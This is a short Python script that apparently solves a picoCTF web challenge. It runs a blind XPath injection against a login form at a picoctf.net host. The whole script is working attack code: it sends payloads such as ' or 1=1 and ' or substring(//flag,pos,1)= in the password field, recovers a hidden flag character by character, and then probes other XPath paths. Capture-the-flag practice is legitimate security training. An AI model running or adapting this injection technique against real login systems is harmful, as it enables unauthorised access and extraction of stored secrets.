import requests

base = 'http://wily-courier.picoctf.net:49463'

def try_pass(p):
    r = requests.post(base, data={'name': 'admin', 'pass': p})
    return 'alert-success' in r.text or 'right path' in r.text

# First verify: does ' or 1=2 fail?
print("Test or 1=2:", try_pass("' or 1=2"))
print("Test or 1=1:", try_pass("' or 1=1"))
print("Empty pass:", try_pass(''))

# Find flag by blind extraction
import string
print('\nExtracting flag...')
flag = ''
charset = string.printable.strip()
pos = 1
while True:
    found = False
    for c in charset:
        # Escape single quote in c
        escaped = c.replace("'", "&apos;")
        payload = "' or substring(//flag," + str(pos) + ",1)='" + escaped + "'"
        if try_pass(payload):
            flag += c
            print('Position ' + str(pos) + ': character ' + repr(c) + ' => flag so far: ' + flag)
            found = True
            break
    if not found or '}' in flag:
        if flag:
            print('Flag:', flag)
        break
    pos += 1
    if pos > 100:
        break

if flag:
    print('Final flag:', flag)
else:
    print('No flag found (maybe wrong extraction method)')
    # Try alternative: check if flag is in attribute or different path
    for path in ['//flag', '//secret', '//*/flag', '//flag/@value', '//flag/text()', '//config/flag', '//data/flag']:
        test = "' or boolean(" + path + ")"
        print('Testing ' + path + ': ' + str(try_pass(test)))